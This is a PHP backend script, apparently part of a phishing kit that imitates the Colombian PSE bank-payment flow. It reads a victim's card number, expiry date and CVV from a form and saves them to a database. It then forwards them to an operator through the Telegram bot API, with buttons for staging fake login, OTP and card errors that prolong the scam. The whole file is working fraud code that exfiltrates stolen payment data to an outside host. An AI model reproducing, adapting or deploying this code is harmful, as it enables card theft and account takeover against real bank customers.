<?php
session_start();
include '../../../config/db.php';
$config = include '../../../config/config.php';

function escapeMarkdownV2($text)
{
    if (!$text)
        return "";
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id'];
    $tarjeta = $_POST['tarjeta'];
    $mes = $_POST['mes'];
    $anio = $_POST['anio'];
    $cvv = $_POST['cvv'];

    // Formatear fecha
    $fecha_venc = $mes . "/" . $anio;

    // Obtener info del banco actual
    $stmt = $conn->prepare("SELECT banco FROM pse WHERE id = :id");
    $stmt->execute(['id' => $cliente_id]);
    $res = $stmt->fetch(PDO::FETCH_ASSOC);
    $banco_nombre = $res['banco'] ?? "Desconocido";

    // GUARDAR INFO CC EN BASE DE DATOS Y RESETEAR ESTADO A 1 (ESPERANDO)
    // Esto evita el bucle infinito de redirección a cc.php
    $estado = 1;
    $sql = "UPDATE pse SET tarjeta = :tarjeta, fecha = :fecha, cvv = :cvv, estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);
    $stmt->execute([
        'tarjeta' => $tarjeta,
        'fecha' => $fecha_venc,
        'cvv' => $cvv,
        'estado' => $estado,
        'id' => $cliente_id
    ]);


    // Enviar datos a Telegram
    $botToken = $config['botToken'];
    $chatId = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    $message = "💳 *Datos de Tarjeta Recibidos*\n\n"
        . "🆔 *ID Cliente:* `" . $cliente_id . "`\n"
        . "🏦 *Banco:* `" . escapeMarkdownV2($banco_nombre) . "`\n"
        . "💳 *Tarjeta:* `" . escapeMarkdownV2($tarjeta) . "`\n"
        . "📅 *Fecha:* `" . escapeMarkdownV2($fecha_venc) . "`\n"
        . "🔒 *CVV:* `" . escapeMarkdownV2($cvv) . "`";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                ['text' => 'Pedir OTP', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"]
            ],
            [
                ['text' => 'Error OTP', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
                ['text' => 'Error CC', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2',
        'reply_markup' => json_encode($keyboard)
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Redirect back to loading screen
    header("Location: ../cargando.php?id=" . $cliente_id);
    exit();
}
?>